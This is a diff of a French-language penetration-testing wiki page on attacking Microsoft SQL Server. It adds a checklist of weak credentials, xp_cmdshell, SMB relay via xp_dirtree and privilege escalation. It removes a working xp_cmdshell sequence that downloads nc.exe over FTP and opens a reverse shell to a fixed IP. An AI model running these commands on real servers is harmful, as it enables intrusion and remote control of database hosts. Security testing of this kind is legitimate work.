@@ -5,9 +5,7 @@ permalink: /Microsoft_SQL_Server/
 
 # Microsoft SQL Server
 
-Utilisation
------------
-
+## Utilisation
 ### Connexion
 
 Impacket posséde un outil *mssqlclient.py*. L'exemple suivant permet de se connecter avec sa/password et d'executer les commandes contenues dans *commands.txt*:
@@ -16,28 +14,18 @@ Impacket posséde un outil *mssqlclient.py*. L'exemple suivant permet de se conn
 mssqlclient.py -port 27900 sa:password@192.168.31.227 -file commands.txt
 ```
 
-### Commandes utiles
+## Checklist
+Eléments à tester pour Microsoft SQL server:
+- Mots de passes par défaut (sa/sa, sa/null) ou faibles (Metasploit, Nessus)
+- Connexion avec comptes du domaines (Metasploit)
+- Enumération des bases de données via SPN (PowerUpSQL)
+- Avec un compte administrateur:
+    - xp_cmdshell
+- Avec un compte à priviléges limités:
+    - xp_dirtree ou xp_filexist pour faire du SMB Relay (si le compte BDD est intéressant)
+    - Elevation de priviléges (Voir PowerUpSQL)
 
-Exploitation
-------------
-
-### Créer un reverse shell
-
-Les commandes suivantes créent un reverse shell en téléchargeant netcat depuis un serveur FTP.
-
-``` text
-EXEC master.dbo.xp_cmdshell 'echo open 192.168.30.229> ftp.txt';
-EXEC master.dbo.xp_cmdshell 'echo USER user>> ftp.txt';
-EXEC master.dbo.xp_cmdshell 'echo 12345>> ftp.txt';
-EXEC master.dbo.xp_cmdshell 'echo bin>> ftp.txt';
-EXEC master.dbo.xp_cmdshell 'echo GET nc.exe>> ftp.txt';
-EXEC master.dbo.xp_cmdshell 'echo bye>> ftp.txt';
-EXEC master.dbo.xp_cmdshell 'ftp -v -n -s:ftp.txt';
-EXEC master.dbo.xp_cmdshell 'nc.exe -nv 192.168.30.229 4444 -e cmd.exe';
-```
-
-Ressources
-----------
+## Ressources
 
 ### Vidéos
 
